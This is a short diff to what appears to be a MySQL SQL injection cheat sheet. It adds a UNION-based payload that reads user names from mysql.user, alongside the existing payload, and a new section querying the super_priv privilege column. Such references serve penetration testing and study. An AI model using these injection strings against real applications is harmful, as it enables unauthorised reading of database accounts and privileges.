@@ -57,4 +57,7 @@ SELECT CURRENT_USER()
 SELECT user from mysql.user
 ```
 
-Injection payload will be : `value' UNION SELECT 1, user(), 3, 4-- -`
+Injection payload will be : `value' UNION SELECT 1, user(), 3, 4-- -` or `value' UNION SELECT 1, user, 3, 4 FROM mysql.user-- -`
+
+## User Privileges
+`SELECT super_priv FROM mysql.user`
